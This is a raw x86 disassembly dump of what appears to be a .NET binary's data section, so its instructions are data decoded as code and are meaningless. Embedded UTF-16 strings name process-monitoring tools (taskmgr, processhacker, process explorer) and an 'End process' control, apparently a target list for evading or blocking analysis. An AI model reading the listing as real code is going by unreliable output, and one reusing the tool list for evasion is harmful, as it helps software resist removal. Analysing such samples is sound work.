  40a0eb:	00 41 00             	add    %al,0x0(%ecx)
  40a0ee:	50                   	push   %eax
  40a0ef:	00 5d 00             	add    %bl,0x0(%ebp)
  40a0f2:	0d 00 0a 00 00       	or     $0xa00,%eax
  40a0f7:	0f 74 00             	pcmpeqb (%eax),%mm0
  40a0fa:	61                   	popa
  40a0fb:	00 73 00             	add    %dh,0x0(%ebx)
  40a0fe:	6b 00 6d             	imul   $0x6d,(%eax),%eax
  40a101:	00 67 00             	add    %ah,0x0(%edi)
  40a104:	72 00                	jb     0x40a106
  40a106:	00 1b                	add    %bl,(%ebx)
  40a108:	70 00                	jo     0x40a10a
  40a10a:	72 00                	jb     0x40a10c
  40a10c:	6f                   	outsl  %ds:(%esi),(%dx)
  40a10d:	00 63 00             	add    %ah,0x0(%ebx)
  40a110:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  40a114:	73 00                	jae    0x40a116
  40a116:	76 00                	jbe    0x40a118
  40a118:	69 00 65 00 77 00    	imul   $0x770065,(%eax),%eax
  40a11e:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40a122:	00 1b                	add    %bl,(%ebx)
  40a124:	70 00                	jo     0x40a126
  40a126:	72 00                	jb     0x40a128
  40a128:	6f                   	outsl  %ds:(%esi),(%dx)
  40a129:	00 63 00             	add    %ah,0x0(%ebx)
  40a12c:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  40a130:	73 00                	jae    0x40a132
  40a132:	68 00 61 00 63       	push   $0x63006100
  40a137:	00 6b 00             	add    %ch,0x0(%ebx)
  40a13a:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40a13e:	00 21                	add    %ah,(%ecx)
  40a140:	70 00                	jo     0x40a142
  40a142:	72 00                	jb     0x40a144
  40a144:	6f                   	outsl  %ds:(%esi),(%dx)
  40a145:	00 63 00             	add    %ah,0x0(%ebx)
  40a148:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  40a14c:	73 00                	jae    0x40a14e
  40a14e:	20 00                	and    %al,(%eax)
  40a150:	65 00 78 00          	add    %bh,%gs:0x0(%eax)
  40a154:	70 00                	jo     0x40a156
  40a156:	6c                   	insb   (%dx),%es:(%edi)
  40a157:	00 6f 00             	add    %ch,0x0(%edi)
  40a15a:	72 00                	jb     0x40a15c
  40a15c:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40a160:	00 0d 62 00 75 00    	add    %cl,0x750062
  40a166:	74 00                	je     0x40a168
  40a168:	74 00                	je     0x40a16a
  40a16a:	6f                   	outsl  %ds:(%esi),(%dx)
  40a16b:	00 6e 00             	add    %ch,0x0(%esi)
  40a16e:	00 0d 73 00 74 00    	add    %cl,0x740073
  40a174:	61                   	popa
  40a175:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  40a179:	00 63 00             	add    %ah,0x0(%ebx)
  40a17c:	00 19                	add    %bl,(%ecx)
  40a17e:	64 00 69 00          	add    %ch,%fs:0x0(%ecx)
  40a182:	72 00                	jb     0x40a184
  40a184:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40a188:	74 00                	je     0x40a18a
  40a18a:	75 00                	jne    0x40a18c
  40a18c:	69 00 68 00 77 00    	imul   $0x770068,(%eax),%eax
  40a192:	6e                   	outsb  %ds:(%esi),(%dx)
  40a193:	00 64 00 00          	add    %ah,0x0(%eax,%eax,1)
  40a197:	17                   	pop    %ss
  40a198:	45                   	inc    %ebp
  40a199:	00 6e 00             	add    %ch,0x0(%esi)
  40a19c:	64 00 20             	add    %ah,%fs:(%eax)
  40a19f:	00 70 00             	add    %dh,0x0(%eax)
  40a1a2:	72 00                	jb     0x40a1a4
  40a1a4:	6f                   	outsl  %ds:(%esi),(%dx)
  40a1a5:	00 63 00             	add    %ah,0x0(%ebx)
  40a1a8:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  40a1ac:	73 00                	jae    0x40a1ae
  40a1ae:	00 00                	add    %al,(%eax)
  40a1b0:	af                   	scas   %es:(%edi),%eax
  40a1b1:	d0 05 7b 59 a9 1f    	rolb   $1,0x1fa9597b
  40a1b7:	4c                   	dec    %esp
  40a1b8:	b1 89                	mov    $0x89,%cl
  40a1ba:	ff 1a                	lcall  *(%edx)
  40a1bc:	67 a8 05             	addr16 test $0x5,%al
  40a1bf:	2b 00                	sub    (%eax),%eax
  40a1c1:	04 20                	add    $0x20,%al
  40a1c3:	01 01                	add    %eax,(%ecx)
  40a1c5:	08 03                	or     %al,(%ebx)
  40a1c7:	20 00                	and    %al,(%eax)
  40a1c9:	01 05 20 01 01 11    	add    %eax,0x11010120
  40a1cf:	15 05 20 02 01       	adc    $0x1022005,%eax
  40a1d4:	0e                   	push   %cs
  40a1d5:	0e                   	push   %cs
  40a1d6:	07                   	pop    %es
  40a1d7:	20 04 01             	and    %al,(%ecx,%eax,1)
  40a1da:	0e                   	push   %cs
  40a1db:	0e                   	push   %cs
  40a1dc:	0e                   	push   %cs
  40a1dd:	0e                   	push   %cs
  40a1de:	04 00                	add    $0x0,%al
  40a1e0:	01 1c 1c             	add    %ebx,(%esp,%ebx,1)
  40a1e3:	04 20                	add    $0x20,%al
  40a1e5:	01 02                	add    %eax,(%edx)
  40a1e7:	1c 03                	sbb    $0x3,%al
  40a1e9:	20 00                	and    %al,(%eax)
  40a1eb:	08 06                	or     %al,(%esi)
  40a1ed:	00 01                	add    %al,(%ecx)
  40a1ef:	12 3d 11 41 03 20    	adc    0x20034111,%bh
  40a1f5:	00 0e                	add    %cl,(%esi)
  40a1f7:	02 1e                	add    (%esi),%bl
  40a1f9:	00 05 10 01 00 1e    	add    %al,0x1e000110
  40a1ff:	00 04 0a             	add    %al,(%edx,%ecx,1)
  40a202:	01 1e                	add    %ebx,(%esi)
  40a204:	00 04 20             	add    %al,(%eax,%eiz,1)
  40a207:	01 01                	add    %eax,(%ecx)
  40a209:	02 06                	add    (%esi),%al
  40a20b:	15 12 18 01 13       	adc    $0x13011812,%eax
  40a210:	00 03                	add    %al,(%ebx)
  40a212:	06                   	push   %es
  40a213:	13 00                	adc    (%eax),%eax
  40a215:	02 13                	add    (%ebx),%dl
  40a217:	00 04 0a             	add    %al,(%edx,%ecx,1)
  40a21a:	01 13                	add    %edx,(%ebx)
  40a21c:	00 06                	add    %al,(%esi)
  40a21e:	15 12 18 01 12       	adc    $0x12011812,%eax
  40a223:	0c 06                	or     $0x6,%al
  40a225:	15 12 18 01 12       	adc    $0x12011812,%eax
  40a22a:	08 06                	or     %al,(%esi)
  40a22c:	15 12 18 01 12       	adc    $0x12011812,%eax
  40a231:	55                   	push   %ebp
  40a232:	06                   	push   %es
  40a233:	15 12 18 01 12       	adc    $0x12011812,%eax
  40a238:	14 04                	adc    $0x4,%al
  40a23a:	20 00                	and    %al,(%eax)
  40a23c:	13 00                	adc    (%eax),%eax
  40a23e:	04 20                	add    $0x20,%al
  40a240:	01 01                	add    %eax,(%ecx)
  40a242:	0e                   	push   %cs
  40a243:	04 00                	add    $0x0,%al
  40a245:	01 02                	add    %eax,(%edx)
  40a247:	0e                   	push   %cs
  40a248:	04 00                	add    $0x0,%al
  40a24a:	01 0e                	add    %ecx,(%esi)
  40a24c:	1c 04                	sbb    $0x4,%al
  40a24e:	00 00                	add    %al,(%eax)
  40a250:	12 79 02             	adc    0x2(%ecx),%bh
  40a253:	1d 05 02 06 18       	sbb    $0x18060205,%eax
  40a258:	05 00 02 02 18       	add    $0x18020200,%eax
  40a25d:	18 04 00             	sbb    %al,(%eax,%eax,1)
  40a260:	01 0a                	add    %ecx,(%edx)
  40a262:	18 04 00             	sbb    %al,(%eax,%eax,1)
  40a265:	01 0e                	add    %ecx,(%esi)
  40a267:	08 06                	or     %al,(%esi)
  40a269:	00 01                	add    %al,(%ecx)
  40a26b:	01 12                	add    %edx,(%edx)
  40a26d:	80 81 03 00 00 01 05 	addb   $0x5,0x1000003(%ecx)
  40a274:	00 00                	add    %al,(%eax)
  40a276:	12 80 95 05 20 01    	adc    0x1200595(%eax),%al
  40a27c:	0e                   	push   %cs
  40a27d:	1d 05 06 00 03       	sbb    $0x3000605,%eax
  40a282:	08 0e                	or     %cl,(%esi)
  40a284:	0e                   	push   %cs
  40a285:	02 05 20 00 12 80    	add    0x80120020,%al
  40a28b:	99                   	cltd
  40a28c:	04 00                	add    $0x0,%al
  40a28e:	01 01                	add    %eax,(%ecx)
  40a290:	08 04 00             	or     %al,(%eax,%eax,1)
  40a293:	01 01                	add    %eax,(%ecx)
  40a295:	1c 05                	sbb    $0x5,%al
  40a297:	20 00                	and    %al,(%eax)
  40a299:	12 80 ad 04 00 01    	adc    0x10004ad(%eax),%al
  40a29f:	08 0e                	or     %cl,(%esi)
  40a2a1:	11 00                	adc    %eax,(%eax)
  40a2a3:	08 1c 1c             	or     %bl,(%esp,%ebx,1)
  40a2a6:	12 3d 0e 1d 1c 1d    	adc    0x1d1c1d0e,%bh
  40a2ac:	0e                   	push   %cs
  40a2ad:	1d 12 3d 1d 02       	sbb    $0x21d3d12,%eax
  40a2b2:	02 06                	add    (%esi),%al
  40a2b4:	00 03                	add    %al,(%ebx)
  40a2b6:	02 1c 1c             	add    (%esp,%ebx,1),%bl
  40a2b9:	02 06                	add    (%esi),%al
  40a2bb:	00 03                	add    %al,(%ebx)
  40a2bd:	0e                   	push   %cs
  40a2be:	0e                   	push   %cs
  40a2bf:	0e                   	push   %cs
  40a2c0:	0e                   	push   %cs
  40a2c1:	05 00 01 0e 1d       	add    $0x1d0e0100,%eax
  40a2c6:	0e                   	push   %cs
  40a2c7:	04 00                	add    $0x0,%al
  40a2c9:	01 0e                	add    %ecx,(%esi)
  40a2cb:	02 05 00 01 1d 05    	add    0x51d0100,%al
  40a2d1:	0e                   	push   %cs
  40a2d2:	05 20 00 12 80       	add    $0x80120020,%eax
  40a2d7:	bd 05 20 00 12       	mov    $0x12002005,%ebp
  40a2dc:	80 c5 05             	add    $0x5,%ch
  40a2df:	00 02                	add    %al,(%edx)
  40a2e1:	0e                   	push   %cs
  40a2e2:	0e                   	push   %cs
  40a2e3:	0e                   	push   %cs
  40a2e4:	07                   	pop    %es
  40a2e5:	20 02                	and    %al,(%edx)
  40a2e7:	12 80 c5 0e 02 05    	adc    0x5020ec5(%eax),%al
  40a2ed:	00 01                	add    %al,(%ecx)
  40a2ef:	0e                   	push   %cs
  40a2f0:	1d 05 06 20 01       	sbb    $0x1200605,%eax
  40a2f5:	12 80 c5 0e 05 20    	adc    0x20050ec5(%eax),%al
  40a2fb:	02 1c 0e             	add    (%esi,%ecx,1),%bl
  40a2fe:	1c 04                	sbb    $0x4,%al
  40a300:	00 01                	add    %al,(%ecx)
  40a302:	0e                   	push   %cs
  40a303:	0e                   	push   %cs
  40a304:	0a 00                	or     (%eax),%al
  40a306:	04 1d                	add    $0x1d,%al
  40a308:	0e                   	push   %cs
  40a309:	0e                   	push   %cs
  40a30a:	0e                   	push   %cs
  40a30b:	08 11                	or     %dl,(%ecx)
  40a30d:	80 d1 04             	adc    $0x4,%cl
  40a310:	06                   	push   %es
  40a311:	12 80 c5 05 20 02    	adc    0x22005c5(%eax),%al
  40a317:	01 0e                	add    %ecx,(%esi)
  40a319:	1c 06                	sbb    $0x6,%al
  40a31b:	00 01                	add    %al,(%ecx)
  40a31d:	12 80 f9 0e 09 00    	adc    0x90ef9(%eax),%al
  40a323:	04 08                	add    $0x8,%al
  40a325:	0e                   	push   %cs
  40a326:	11 80 fd 02 08 0d    	adc    %eax,0xd0802fd(%eax)
  40a32c:	00 04 11             	add    %al,(%ecx,%edx,1)
  40a32f:	81 01 0e 0e 11 80    	addl   $0x80110e0e,(%ecx)
  40a335:	dd 11                	fstl   (%ecx)
  40a337:	80 e1 05             	and    $0x5,%cl
  40a33a:	00 02                	add    %al,(%edx)
  40a33c:	1c 0e                	sbb    $0xe,%al
  40a33e:	0e                   	push   %cs
  40a33f:	06                   	push   %es
  40a340:	00 02                	add    %al,(%edx)
  40a342:	1c 1c                	sbb    $0x1c,%al
  40a344:	12 3d 04 00 01 0d    	adc    0xd010004,%bh
  40a34a:	0e                   	push   %cs
  40a34b:	04 00                	add    $0x0,%al
  40a34d:	01 0d 0d 09 20 04    	add    %ecx,0x420090d
  40a353:	01 0e                	add    %ecx,(%esi)
  40a355:	0e                   	push   %cs
  40a356:	1c 11                	sbb    $0x11,%al
  40a358:	81 11 03 00 00 0e    	adcl   $0xe000003,(%ecx)
  40a35e:	06                   	push   %es
  40a35f:	00 02                	add    %al,(%edx)
  40a361:	01 0e                	add    %ecx,(%esi)
  40a363:	1d 05 05 20 00       	sbb    $0x200505,%eax
  40a368:	12 81 21 07 20 02    	adc    0x2200721(%ecx),%al
  40a36e:	01 0e                	add    %ecx,(%esi)
  40a370:	11 81 25 06 00 01    	adc    %eax,0x1000625(%ecx)
  40a376:	12 81 29 0e 07 20    	adc    0x20070e29(%ecx),%al
  40a37c:	02 01                	add    (%ecx),%al
  40a37e:	12 81 29 08 0c 20    	adc    0x200c0829(%ecx),%al
  40a384:	03 01                	add    (%ecx),%eax
  40a386:	11 81 2d 11 81 31    	adc    %eax,0x3181112d(%ecx)
  40a38c:	11 81 35 08 20 02    	adc    %eax,0x2200835(%ecx)
  40a392:	08 1d 05 12 81 39    	or     %bl,0x39811205
  40a398:	07                   	pop    %es
  40a399:	00 04 0e             	add    %al,(%esi,%ecx,1)
  40a39c:	0e                   	push   %cs
  40a39d:	0e                   	push   %cs
  40a39e:	0e                   	push   %cs
  40a39f:	0e                   	push   %cs
  40a3a0:	05 00 02 1c 1c       	add    $0x1c1c0200,%eax
  40a3a5:	1c 04                	sbb    $0x4,%al
  40a3a7:	20 01                	and    %al,(%ecx)
  40a3a9:	03 08                	add    (%eax),%ecx
  40a3ab:	07                   	pop    %es
  40a3ac:	20 03                	and    %al,(%ebx)
  40a3ae:	01 1d 05 08 08 04    	add    %ebx,0x4080805
  40a3b4:	20 00                	and    %al,(%eax)
  40a3b6:	1d 05 05 20 01       	sbb    $0x1200505,%eax
  40a3bb:	1d 05 0e 0e 00       	sbb    $0xe0e05,%eax
  40a3c0:	06                   	push   %es
  40a3c1:	01 1c 12             	add    %ebx,(%edx,%edx,1)
  40a3c4:	3d 0e 1d 1c 1d       	cmp    $0x1d1c1d0e,%eax
  40a3c9:	0e                   	push   %cs
  40a3ca:	1d 12 3d 10 00       	sbb    $0x103d12,%eax
  40a3cf:	07                   	pop    %es
  40a3d0:	1c 1c                	sbb    $0x1c,%al
  40a3d2:	12 3d 0e 1d 1c 1d    	adc    0x1d1c1d0e,%bh
  40a3d8:	0e                   	push   %cs
  40a3d9:	1d 12 3d 1d 02       	sbb    $0x21d3d12,%eax
  40a3de:	06                   	push   %es
  40a3df:	00 03                	add    %al,(%ebx)
  40a3e1:	1c 1c                	sbb    $0x1c,%al
  40a3e3:	1c 02                	sbb    $0x2,%al
  40a3e5:	04 00                	add    $0x0,%al
  40a3e7:	01 02                	add    %eax,(%edx)
  40a3e9:	1c 05                	sbb    $0x5,%al
  40a3eb:	00 00                	add    %al,(%eax)
  40a3ed:	12 81 3d 05 20 00    	adc    0x20053d(%ecx),%al
  40a3f3:	11 80 f1 08 20 03    	adc    %eax,0x32008f1(%eax)
  40a3f9:	01 08                	add    %ecx,(%eax)
  40a3fb:	08 11                	or     %dl,(%ecx)
  40a3fd:	81 41 08 00 01 12 80 	addl   $0x80120100,0x8(%ecx)
  40a404:	f5                   	cmc
  40a405:	12 81 45 05 20 02    	adc    0x2200545(%ecx),%al
  40a40b:	01 08                	add    %ecx,(%eax)
  40a40d:	08 0d 20 06 01 08    	or     %cl,0x8010620
  40a413:	08 08                	or     %cl,(%eax)
  40a415:	08 11                	or     %dl,(%ecx)
  40a417:	80 ed 11             	sub    $0x11,%ch
  40a41a:	81 49 05 00 00 11 81 	orl    $0x81110000,0x5(%ecx)
  40a421:	4d                   	dec    %ebp
  40a422:	09 20                	or     %esp,(%eax)
  40a424:	02 01                	add    (%ecx),%al
  40a426:	11 81 4d 11 80 ed    	adc    %eax,-0x127feeb3(%ecx)
  40a42c:	05 00 00 12 81       	add    $0x81120000,%eax
  40a431:	15 09 20 02 01       	adc    $0x1022009,%eax
  40a436:	12 80 f5 11 80 f1    	adc    -0xe7fee0b(%eax),%al
  40a43c:	0a 20                	or     (%eax),%ah
  40a43e:	05 01 12 81 45       	add    $0x45811201,%eax
  40a443:	08 08                	or     %cl,(%eax)
  40a445:	08 08                	or     %cl,(%eax)
  40a447:	05 00 00 12 81       	add    $0x81120000,%eax
  40a44c:	55                   	push   %ebp
  40a44d:	09 20                	or     %esp,(%eax)
  40a44f:	02 01                	add    (%ecx),%al
  40a451:	12 80 a9 12 81 55    	adc    0x558112a9(%eax),%al
  40a457:	03 20                	add    (%eax),%esp
  40a459:	00 0a                	add    %cl,(%edx)
  40a45b:	04 20                	add    $0x20,%al
  40a45d:	01 01                	add    %eax,(%ecx)
  40a45f:	05 07 00 02 12       	add    $0x12020007,%eax
  40a464:	80 f9 0e             	cmp    $0xe,%cl
  40a467:	0e                   	push   %cs
  40a468:	05 20 00 11 81       	add    $0x81110020,%eax
  40a46d:	5d                   	pop    %ebp
  40a46e:	04 20                	add    $0x20,%al
  40a470:	01 0e                	add    %ecx,(%esi)
  40a472:	0e                   	push   %cs
  40a473:	05 20 00 12 81       	add    $0x81120020,%eax
  40a478:	65 05 20 02 0e 0e    	gs add $0xe0e0220,%eax
  40a47e:	0e                   	push   %cs
  40a47f:	05 00 00 12 81       	add    $0x81120000,%eax
  40a484:	69 06 00 01 0e 11    	imul   $0x110e0100,(%esi),%eax
  40a48a:	81 6d 04 20 01 02 0e 	subl   $0xe020120,0x4(%ebp)
  40a491:	09 20                	or     %esp,(%eax)
  40a493:	02 12                	add    (%edx),%dl
  40a495:	80 c5 0e             	add    $0xe,%ch
  40a498:	11 81 71 04 20 00    	adc    %eax,0x200471(%ecx)
  40a49e:	1d 0e 07 00 02       	sbb    $0x200070e,%eax
  40a4a3:	01 0e                	add    %ecx,(%esi)
  40a4a5:	11 81 75 04 00 01    	adc    %eax,0x1000475(%ecx)
  40a4ab:	01 0e                	add    %ecx,(%esi)
  40a4ad:	06                   	push   %es
  40a4ae:	00 03                	add    %al,(%ebx)
  40a4b0:	01 0e                	add    %ecx,(%esi)
  40a4b2:	0e                   	push   %cs
  40a4b3:	02 07                	add    (%edi),%al
  40a4b5:	20 02                	and    %al,(%edx)
  40a4b7:	01 0e                	add    %ecx,(%esi)
  40a4b9:	11 81 81 05 20 00    	adc    %eax,0x200581(%ecx)
  40a4bf:	12 81 85 05 20 00    	adc    0x200585(%ecx),%al
  40a4c5:	12 81 89 04 00 00    	adc    0x489(%ecx),%al
  40a4cb:	1d 0e 05 00 02       	sbb    $0x200050e,%eax
  40a4d0:	01 0e                	add    %ecx,(%esi)
  40a4d2:	0e                   	push   %cs
  40a4d3:	07                   	pop    %es
  40a4d4:	20 03                	and    %al,(%ebx)
  40a4d6:	01 02                	add    %eax,(%edx)
  40a4d8:	0e                   	push   %cs
  40a4d9:	10 02                	adc    %al,(%edx)
  40a4db:	05 20 02 01 1c       	add    $0x1c010220,%eax
  40a4e0:	18 07                	sbb    %al,(%edi)
  40a4e2:	20 02                	and    %al,(%edx)
  40a4e4:	01 12                	add    %edx,(%edx)
  40a4e6:	81 99 08 06 20 01 01 	sbbl   $0x99811201,0x1200608(%ecx)
  40a4ed:	12 81 99 
  40a4f0:	06                   	push   %es
  40a4f1:	00 01                	add    %al,(%ecx)
  40a4f3:	01 12                	add    %edx,(%edx)
  40a4f5:	81 9d 05 00 00 12 80 	sbbl   $0x4f980,0x12000005(%ebp)
  40a4fc:	f9 04 00 
  40a4ff:	01 18                	add    %ebx,(%eax)
  40a501:	08 04 20             	or     %al,(%eax,%eiz,1)
  40a504:	01 01                	add    %eax,(%ecx)
  40a506:	18 06                	sbb    %al,(%esi)
  40a508:	20 01                	and    %al,(%ecx)
  40a50a:	1d 05 1d 05 06       	sbb    $0x6051d05,%eax
  40a50f:	00 01                	add    %al,(%ecx)
  40a511:	12 79 1d             	adc    0x1d(%ecx),%bh
  40a514:	05 06 20 00 1d       	add    $0x1d002006,%eax
  40a519:	12 81 ad 05 20 00    	adc    0x2005ad(%ecx),%al
  40a51f:	1d 12 3d 04 20       	sbb    $0x20043d12,%eax
  40a524:	00 12                	add    %dl,(%edx)
  40a526:	79 04                	jns    0x40a52c
  40a528:	20 01                	and    %al,(%ecx)
  40a52a:	1c 0e                	sbb    $0xe,%al
  40a52c:	03 20                	add    (%eax),%esp
  40a52e:	00 18                	add    %bl,(%eax)
  40a530:	07                   	pop    %es
  40a531:	20 02                	and    %al,(%edx)
  40a533:	02 08                	add    (%eax),%cl
  40a535:	11 81 b1 05 20 00    	adc    %eax,0x2005b1(%ecx)
  40a53b:	12 81 b5 04 00 01    	adc    0x10004b5(%ecx),%al
  40a541:	0a 0e                	or     (%esi),%cl
  40a543:	04 00                	add    $0x0,%al
  40a545:	01 03                	add    %eax,(%ebx)
  40a547:	08 0a                	or     %cl,(%edx)
  40a549:	20 04 08             	and    %al,(%eax,%ecx,1)
  40a54c:	1d 05 08 08 11       	sbb    $0x11080805,%eax
  40a551:	81 bd 07 20 02 01 12 	cmpl   $0x8c18112,0x1022007(%ebp)
  40a558:	81 c1 08 
  40a55b:	04 20                	add    $0x20,%al
  40a55d:	01 01                	add    %eax,(%ecx)
  40a55f:	1c 04                	sbb    $0x4,%al
  40a561:	20 01                	and    %al,(%ecx)
  40a563:	02 08                	add    (%eax),%cl
  40a565:	08 20                	or     %ah,(%eax)
  40a567:	03 01                	add    (%ecx),%eax
  40a569:	0e                   	push   %cs
  40a56a:	1c 11                	sbb    $0x11,%al
  40a56c:	81 11 05 20 02 01    	adcl   $0x1022005,(%ecx)
  40a572:	0e                   	push   %cs
  40a573:	02 05 20 01 01 1d    	add    0x1d010120,%al
  40a579:	05 09 20 02 01       	add    $0x1022009,%eax
  40a57e:	12 80 a9 11 81 c9    	adc    -0x367eee57(%eax),%al
  40a584:	04 20                	add    $0x20,%al
  40a586:	01 01                	add    %eax,(%ecx)
  40a588:	0a 07                	or     (%edi),%al
  40a58a:	20 03                	and    %al,(%ebx)
  40a58c:	08 1d 05 08 08 06    	or     %bl,0x6080805
  40a592:	00 02                	add    %al,(%edx)
  40a594:	08 1d 05 08 06 00    	or     %bl,0x60805
  40a59a:	01 12                	add    %edx,(%edx)
  40a59c:	80 f9 08             	cmp    $0x8,%cl
  40a59f:	05 00 00 11 81       	add    $0x81110000,%eax
  40a5a4:	5d                   	pop    %ebp
  40a5a5:	05 20 00 12 81       	add    $0x81120020,%eax
  40a5aa:	d9 03                	flds   (%ebx)
  40a5ac:	20 00                	and    %al,(%eax)
  40a5ae:	02 05 20 02 0e 08    	add    0x80e0220,%al
  40a5b4:	08 06                	or     %al,(%esi)
  40a5b6:	15 12 81 f1 01       	adc    $0x1f18112,%eax
  40a5bb:	18 05 20 01 01 13    	sbb    %al,0x13010120
  40a5c1:	00 04 00             	add    %al,(%eax,%eax,1)
  40a5c4:	01 08                	add    %ecx,(%eax)
  40a5c6:	18 05 20 01 13 00    	sbb    %al,0x130120
  40a5cc:	08 05 20 00 1d 13    	or     %al,0x131d0020
  40a5d2:	00 08                	add    %cl,(%eax)
  40a5d4:	b7 7a                	mov    $0x7a,%bh
  40a5d6:	5c                   	pop    %esp
  40a5d7:	56                   	push   %esi
  40a5d8:	19 34 e0             	sbb    %esi,(%eax,%eiz,8)
  40a5db:	89 08                	mov    %ecx,(%eax)
  40a5dd:	b0 3f                	mov    $0x3f,%al
  40a5df:	5f                   	pop    %edi
  40a5e0:	7f 11                	jg     0x40a5f3
  40a5e2:	d5 0a                	aad    $0xa
  40a5e4:	3a 08                	cmp    (%eax),%cl
  40a5e6:	01 00                	add    %eax,(%eax)
  40a5e8:	01 00                	add    %eax,(%eax)
  40a5ea:	00 00                	add    %al,(%eax)
  40a5ec:	00 00                	add    %al,(%eax)
  40a5ee:	17                   	pop    %ss
  40a5ef:	01 00                	add    %eax,(%eax)
  40a5f1:	0a 4d 79             	or     0x79(%ebp),%cl
  40a5f4:	54                   	push   %esp
  40a5f5:	65 6d                	gs insl (%dx),%es:(%edi)
  40a5f7:	70 6c                	jo     0x40a665
  40a5f9:	61                   	popa
  40a5fa:	74 65                	je     0x40a661
  40a5fc:	07                   	pop    %es
  40a5fd:	38 2e                	cmp    %ch,(%esi)
  40a5ff:	30 2e                	xor    %ch,(%esi)
  40a601:	30 2e                	xor    %ch,(%esi)
  40a603:	30 00                	xor    %al,(%eax)
  40a605:	00 04 01             	add    %al,(%ecx,%eax,1)
  40a608:	00 00                	add    %al,(%eax)
  40a60a:	00 61 01             	add    %ah,0x1(%ecx)
  40a60d:	00 34 53             	add    %dh,(%ebx,%edx,2)
  40a610:	79 73                	jns    0x40a685
  40a612:	74 65                	je     0x40a679
  40a614:	6d                   	insl   (%dx),%es:(%edi)
  40a615:	2e 57                	cs push %edi
  40a617:	65 62 2e             	bound  %ebp,%gs:(%esi)
  40a61a:	53                   	push   %ebx
  40a61b:	65 72 76             	gs jb  0x40a694
  40a61e:	69 63 65 73 2e 50 72 	imul   $0x72502e73,0x65(%ebx),%esp
  40a625:	6f                   	outsl  %ds:(%esi),(%dx)
  40a626:	74 6f                	je     0x40a697
  40a628:	63 6f 6c             	arpl   %ebp,0x6c(%edi)
  40a62b:	73 2e                	jae    0x40a65b
  40a62d:	53                   	push   %ebx
  40a62e:	6f                   	outsl  %ds:(%esi),(%dx)
  40a62f:	61                   	popa
  40a630:	70 48                	jo     0x40a67a
  40a632:	74 74                	je     0x40a6a8
  40a634:	70 43                	jo     0x40a679
  40a636:	6c                   	insb   (%dx),%es:(%edi)
  40a637:	69 65 6e 74 50 72 6f 	imul   $0x6f725074,0x6e(%ebp),%esp
  40a63e:	74 6f                	je     0x40a6af
  40a640:	63 6f 6c             	arpl   %ebp,0x6c(%edi)
  40a643:	12 43 72             	adc    0x72(%ebx),%al
  40a646:	65 61                	gs popa
  40a648:	74 65                	je     0x40a6af
  40a64a:	5f                   	pop    %edi
  40a64b:	5f                   	pop    %edi
  40a64c:	49                   	dec    %ecx
  40a64d:	6e                   	outsb  %ds:(%esi),(%dx)
  40a64e:	73 74                	jae    0x40a6c4
  40a650:	61                   	popa
  40a651:	6e                   	outsb  %ds:(%esi),(%dx)
  40a652:	63 65 5f             	arpl   %esp,0x5f(%ebp)
  40a655:	5f                   	pop    %edi
  40a656:	13 44 69 73          	adc    0x73(%ecx,%ebp,2),%eax
  40a65a:	70 6f                	jo     0x40a6cb
  40a65c:	73 65                	jae    0x40a6c3
  40a65e:	5f                   	pop    %edi
  40a65f:	5f                   	pop    %edi
  40a660:	49                   	dec    %ecx
  40a661:	6e                   	outsb  %ds:(%esi),(%dx)
  40a662:	73 74                	jae    0x40a6d8
  40a664:	61                   	popa
  40a665:	6e                   	outsb  %ds:(%esi),(%dx)
  40a666:	63 65 5f             	arpl   %esp,0x5f(%ebp)
  40a669:	5f                   	pop    %edi
  40a66a:	00 00                	add    %al,(%eax)
  40a66c:	00 05 01 00 00 00    	add    %al,0x1
  40a672:	00 07                	add    %al,(%edi)
  40a674:	06                   	push   %es
  40a675:	15 12 18 01 12       	adc    $0x12011812,%eax
  40a67a:	0c 07                	or     $0x7,%al
  40a67c:	06                   	push   %es
  40a67d:	15 12 18 01 12       	adc    $0x12011812,%eax
  40a682:	08 07                	or     %al,(%edi)
  40a684:	06                   	push   %es
  40a685:	15 12 18 01 12       	adc    $0x12011812,%eax
  40a68a:	55                   	push   %ebp
  40a68b:	07                   	pop    %es
  40a68c:	06                   	push   %es
  40a68d:	15 12 18 01 12       	adc    $0x12011812,%eax
  40a692:	14 04                	adc    $0x4,%al
  40a694:	00 00                	add    %al,(%eax)
  40a696:	12 0c 04             	adc    (%esp,%eax,1),%cl
  40a699:	00 00                	add    %al,(%eax)
  40a69b:	12 08                	adc    (%eax),%cl
  40a69d:	04 00                	add    $0x0,%al
  40a69f:	00 12                	add    %dl,(%edx)
  40a6a1:	55                   	push   %ebp
  40a6a2:	04 00                	add    $0x0,%al
  40a6a4:	00 12                	add    %dl,(%edx)
  40a6a6:	14 04                	adc    $0x4,%al
  40a6a8:	20 00                	and    %al,(%eax)
  40a6aa:	12 3d 07 10 01 01    	adc    0x1011007,%bh
  40a6b0:	1e                   	push   %ds
  40a6b1:	00 1e                	add    %bl,(%esi)
  40a6b3:	00 07                	add    %al,(%edi)
  40a6b5:	30 01                	xor    %al,(%ecx)
  40a6b7:	01 01                	add    %eax,(%ecx)
  40a6b9:	10 1e                	adc    %bl,(%esi)
  40a6bb:	00 02                	add    %al,(%edx)
  40a6bd:	06                   	push   %es
  40a6be:	0e                   	push   %cs
  40a6bf:	02 06                	add    (%esi),%al
  40a6c1:	08 02                	or     %al,(%edx)
  40a6c3:	06                   	push   %es
  40a6c4:	02 03                	add    (%ebx),%al
  40a6c6:	06                   	push   %es
  40a6c7:	1d 05 03 06 12       	sbb    $0x12060305,%eax
  40a6cc:	61                   	popa
  40a6cd:	03 06                	add    (%esi),%eax
  40a6cf:	12 21                	adc    (%ecx),%ah
  40a6d1:	03 06                	add    (%esi),%eax
  40a6d3:	12 65 03             	adc    0x3(%ebp),%ah
  40a6d6:	06                   	push   %es
  40a6d7:	12 24 03             	adc    (%ebx,%eax,1),%ah
  40a6da:	06                   	push   %es
  40a6db:	12 69 03             	adc    0x3(%ecx),%ch
  40a6de:	06                   	push   %es
  40a6df:	12 6d 02             	adc    0x2(%ebp),%ch
  40a6e2:	06                   	push   %es
  40a6e3:	1c 03                	sbb    $0x3,%al
  40a6e5:	06                   	push   %es
